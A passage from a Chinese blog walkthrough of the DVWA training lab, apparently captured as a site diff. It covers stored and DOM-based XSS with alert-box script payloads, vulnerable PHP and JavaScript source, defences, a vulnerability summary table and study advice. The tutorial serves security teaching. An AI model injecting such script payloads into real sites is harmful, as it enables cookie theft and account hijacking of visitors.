+<h4 id="第二步：注入-XSS"><a href="#第二步：注入-XSS" class="headerlink" title="第二步：注入 XSS"></a>第二步：注入 XSS</h4><p>在 Message 输入框中输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Stored XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>Name 随意填写，点击 Sign Guestbook。</p>
+<p><strong>此时，每次你刷新这个页面，都会弹出对话框！</strong> 因为恶意代码被保存到了数据库中，每次加载页面时都会从数据库读取并显示。</p>
+<h4 id="第三步：理解危害"><a href="#第三步：理解危害" class="headerlink" title="第三步：理解危害"></a>第三步：理解危害</h4><p>想象一下：如果攻击者在一个论坛的帖子里注入了窃取 Cookie 的 JavaScript 代码，那么<strong>每个浏览这个帖子的人</strong>的 Cookie 都会被窃取，攻击者就能冒充他们的身份登录。</p>
+<h3 id="10-3-漏洞原理（源码分析）"><a href="#10-3-漏洞原理（源码分析）" class="headerlink" title="10.3 漏洞原理（源码分析）"></a>10.3 漏洞原理（源码分析）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>( <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>( <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> );<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意看：代码使用了 <code>mysqli_real_escape_string()</code> 来<strong>防止 SQL 注入</strong>（这是好事！），但是<strong>没有对输出进行 HTML 转义</strong>。所以 <code>&lt;script&gt;</code> 标签被原样存入数据库，读取显示时也没有被转义，从而导致了 XSS。</p>
+<p><strong>这告诉我们一个重要道理</strong>：防御 SQL 注入和防御 XSS 是两件不同的事，需要分别处理。</p>
+<h3 id="10-4-知识点总结"><a href="#10-4-知识点总结" class="headerlink" title="10.4 知识点总结"></a>10.4 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>存储型 XSS</td>
+<td>恶意代码被保存到服务器，每次访问都会触发</td>
+</tr>
+<tr>
+<td>危害最大</td>
+<td>因为影响所有访问该页面的用户</td>
+</tr>
+<tr>
+<td>输入过滤 vs 输出转义</td>
+<td>输入过滤防 SQL 注入，输出转义防 XSS，两者缺一不可</td>
+</tr>
+</tbody></table>
+<h3 id="10-5-防御方法"><a href="#10-5-防御方法" class="headerlink" title="10.5 防御方法"></a>10.5 防御方法</h3><ul>
+<li><strong>输出时进行 HTML 转义</strong>：使用 <code>htmlspecialchars()</code> 函数将特殊字符转义</li>
+<li><strong>富文本过滤</strong>：如果需要支持富文本，使用白名单策略只允许安全的 HTML 标签和属性</li>
+</ul>
+<hr>
+<h2 id="十一、XSS（DOM）（DOM-型跨站脚本）"><a href="#十一、XSS（DOM）（DOM-型跨站脚本）" class="headerlink" title="十一、XSS（DOM）（DOM 型跨站脚本）"></a>十一、XSS（DOM）（DOM 型跨站脚本）</h2><h3 id="11-1-这个漏洞是什么？"><a href="#11-1-这个漏洞是什么？" class="headerlink" title="11.1 这个漏洞是什么？"></a>11.1 这个漏洞是什么？</h3><p><strong>DOM 型 XSS</strong> 与前两种 XSS 的区别在于：</p>
+<ul>
+<li>反射型和存储型的恶意代码会经过<strong>服务器</strong>处理</li>
+<li>DOM 型 XSS <strong>完全在客户端（浏览器）</strong> 发生，恶意代码不会发送到服务器</li>
+</ul>
+<p>DOM（Document Object Model）是浏览器将 HTML 文档解析后生成的<strong>树形结构</strong>。JavaScript 可以通过 DOM API 来<strong>修改页面内容</strong>。如果 JavaScript 代码直接使用了不受信任的输入（如 URL 参数）来修改 DOM，就可能产生 DOM 型 XSS。</p>
+<p>打个比方：前两种 XSS 是厨师（服务器）在菜里下了毒，DOM XSS 是你自己（浏览器）拿着不明食材做菜时中了毒。</p>
+<h3 id="11-2-前置知识：DOM-操作"><a href="#11-2-前置知识：DOM-操作" class="headerlink" title="11.2 前置知识：DOM 操作"></a>11.2 前置知识：DOM 操作</h3><table>
+<thead>
+<tr>
+<th>JavaScript 代码</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>document.write()</code></td>
+<td>向页面写入内容</td>
+</tr>
+<tr>
+<td><code>document.getElementById(&#39;id&#39;).innerHTML</code></td>
+<td>获取或设置元素的 HTML 内容</td>
+</tr>
+<tr>
+<td><code>document.getElementById(&#39;id&#39;).src</code></td>
+<td>设置元素的来源（如图片地址）</td>
+</tr>
+<tr>
+<td><code>location.hash</code></td>
+<td>获取 URL 中 <code>#</code> 后面的部分</td>
+</tr>
+<tr>
+<td><code>window.location.search</code></td>
+<td>获取 URL 中 <code>?</code> 后面的查询参数</td>
+</tr>
+</tbody></table>
+<h3 id="11-3-动手实践"><a href="#11-3-动手实践" class="headerlink" title="11.3 动手实践"></a>11.3 动手实践</h3><h4 id="第一步：观察页面"><a href="#第一步：观察页面" class="headerlink" title="第一步：观察页面"></a>第一步：观察页面</h4><ol>
+<li>点击左侧的 <strong>XSS (DOM)</strong></li>
+<li>页面上有一个下拉选择框，选择不同的选项会改变页面上显示的语言</li>
+<li>观察 URL，类似于：<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">...<span class="hljs-regexp">/xss_d/</span>?<span class="hljs-keyword">default</span>=English<br></code></pre></td></tr></table></figure>
+选择不同选项时，<code>default</code> 参数会变化</li>
+</ol>
+<h4 id="第二步：测试-DOM-XSS"><a href="#第二步：测试-DOM-XSS" class="headerlink" title="第二步：测试 DOM XSS"></a>第二步：测试 DOM XSS</h4><p>将 URL 中的 <code>default</code> 参数修改为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">.../xss_d/?<span class="hljs-keyword">default</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;DOM XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>按回车访问。如果弹出对话框，说明存在 DOM XSS 漏洞。</p>
+<h4 id="第三步：理解原理"><a href="#第三步：理解原理" class="headerlink" title="第三步：理解原理"></a>第三步：理解原理</h4><p>右键页面 → <strong>查看页面源代码</strong>（不是”检查”），你会看到类似这样的 JavaScript：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;xss_d&quot;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;Welcome &quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure>
+
+<p>这段代码：</p>
+<ol>
+<li>获取 URL 中 <code>=</code> 后面的内容</li>
+<li>直接用 <code>innerHTML</code> 插入到页面中</li>
+<li>如果 URL 参数包含 <code>&lt;script&gt;</code> 标签，就会被当作 HTML 执行</li>
+</ol>
+<h3 id="11-4-知识点总结"><a href="#11-4-知识点总结" class="headerlink" title="11.4 知识点总结"></a>11.4 知识点总结</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DOM</td>
+<td>浏览器解析 HTML 后生成的文档对象模型</td>
+</tr>
+<tr>
+<td>DOM XSS</td>
+<td>漏洞出在前端 JavaScript 代码中，不经过服务器</td>
+</tr>
+<tr>
+<td>innerHTML</td>
+<td>设置元素 HTML 内容的属性，使用不安全会导致 XSS</td>
+</tr>
+<tr>
+<td>document.write()</td>
+<td>向文档写入内容，同样不安全</td>
+</tr>
+</tbody></table>
+<h3 id="11-5-防御方法"><a href="#11-5-防御方法" class="headerlink" title="11.5 防御方法"></a>11.5 防御方法</h3><ul>
+<li><strong>避免使用 innerHTML</strong>：使用 <code>textContent</code> 代替（textContent 不会解析 HTML）</li>
+<li><strong>对输入进行验证和转义</strong>：即使用户输入只来自 URL，也要处理</li>
+<li><strong>使用安全的 DOM API</strong>：如 <code>document.createElement()</code> + <code>element.textContent</code></li>
+</ul>
+<hr>
+<h2 id="十二、总结与学习建议"><a href="#十二、总结与学习建议" class="headerlink" title="十二、总结与学习建议"></a>十二、总结与学习建议</h2><h3 id="12-1-DVWA-Low-级别所有漏洞一览"><a href="#12-1-DVWA-Low-级别所有漏洞一览" class="headerlink" title="12.1 DVWA Low 级别所有漏洞一览"></a>12.1 DVWA Low 级别所有漏洞一览</h3><table>
+<thead>
+<tr>
+<th>序号</th>
+<th>漏洞名称</th>
+<th>漏洞类型</th>
+<th>核心原理</th>
+<th>危害等级</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Brute Force</td>
+<td>认证类</td>
+<td>无限制的登录尝试</td>
+<td>中</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Command Injection</td>
+<td>代码执行类</td>
+<td>用户输入被拼入系统命令</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>3</td>
+<td>CSRF</td>
+<td>认证类</td>
+<td>伪造用户请求</td>
+<td>高</td>
+</tr>
+<tr>
+<td>4</td>
+<td>File Inclusion</td>
+<td>代码执行类</td>
+<td>用户控制被包含的文件路径</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>5</td>
+<td>File Upload</td>
+<td>代码执行类</td>
+<td>上传恶意脚本文件</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>6</td>
+<td>SQL Injection</td>
+<td>数据泄露类</td>
+<td>用户输入被拼入 SQL 语句</td>
+<td>极高</td>
+</tr>
+<tr>
+<td>7</td>
+<td>SQL Injection (Blind)</td>
+<td>数据泄露类</td>
+<td>通过布尔&#x2F;时间差异猜数据</td>
+<td>高</td>
+</tr>
+<tr>
+<td>8</td>
+<td>XSS (Reflected)</td>
+<td>客户端攻击</td>
+<td>恶意 JS 通过 URL 反射回页面</td>
+<td>中</td>
+</tr>
+<tr>
+<td>9</td>
+<td>XSS (Stored)</td>
+<td>客户端攻击</td>
+<td>恶意 JS 被保存到服务器</td>
+<td>高</td>
+</tr>
+<tr>
+<td>10</td>
+<td>XSS (DOM)</td>
+<td>客户端攻击</td>
+<td>前端 JS 代码不安全处理输入</td>
+<td>中</td>
+</tr>
+</tbody></table>
+<h3 id="12-2-所有漏洞的共同根因"><a href="#12-2-所有漏洞的共同根因" class="headerlink" title="12.2 所有漏洞的共同根因"></a>12.2 所有漏洞的共同根因</h3><p>尽管这 10 个漏洞的表现形式各不相同，但它们有一个<strong>共同的根因</strong>：</p>
+<blockquote>
+<p><strong>后端代码（或前端代码）没有对用户输入进行充分的验证和过滤，直接信任并使用了用户输入。</strong></p>
+</blockquote>
+<p>这被称为 <strong>“永远不要信任用户输入”（Never Trust User Input）</strong> 原则——这是 Web 安全的第一法则。</p>
+<h3 id="12-3-学习路线建议"><a href="#12-3-学习路线建议" class="headerlink" title="12.3 学习路线建议"></a>12.3 学习路线建议</h3><ol>
+<li><strong>扎实掌握 Low 级别</strong>：理解每个漏洞的原理，不要只是照步骤操作</li>
+<li><strong>尝试 Medium 和 High 级别</strong>：看看加了防护后如何绕过（或无法绕过）</li>
+<li><strong>学习 Impossible 级别的源码</strong>：看看安全的代码是怎么写的</li>
+<li><strong>学习使用工具</strong>：Burp Suite、SQLMap、Nmap、OWASP ZAP</li>
+<li><strong>系统学习</strong>：参考 OWASP Top 10，了解当前最主流的 Web 安全威胁</li>
+<li><strong>实战练习</strong>：除了 DVWA，还可以尝试以下靶场：<ul>
+<li><strong>WebGoat</strong>：OWASP 出品的教学靶场</li>
+<li><strong>Pikachu</strong>：国内的中文靶场，适合初学者</li>
+<li><strong>HackTheBox</strong>：在线实战平台</li>
+<li><strong>PortSwigger Web Security Academy</strong>：Burp Suite 官方免费教程</li>
+</ul>
+</li>
+</ol>
+<h3 id="12-4-推荐资源"><a href="#12-4-推荐资源" class="headerlink" title="12.4 推荐资源"></a>12.4 推荐资源</h3><ul>
+<li><strong>OWASP（开放Web应用安全项目）</strong>：<a target="_blank" rel="noopener" href="https://owasp.org/">https://owasp.org</a> — 最权威的 Web 安全知识来源</li>
+<li><strong>PortSwigger Web Security Academy</strong>：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security">https://portswigger.net/web-security</a> — 免费的交互式 Web 安全教程</li>
+<li><strong>MDN Web Docs</strong>：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/">https://developer.mozilla.org</a> — 前端开发权威文档</li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>最后提醒</strong>：技术是一把双刃剑。学这些知识的目的是<strong>更好地保护系统</strong>，而不是攻击他人。请始终遵守法律法规，在合法授权的范围内进行安全测试和学习。</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="category-chain-item">安全笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DVWA_Low_通关教程</div>
+      <div>https://chiya-66.github.io/2026/07/18/DVWA_Low_通关教程/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年7月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/07/18/rce/" title="命令注入相关的特殊字符">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">命令注入相关的特殊字符</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/07/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集">
+                        <span class="hidden-mobile">信息收集</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
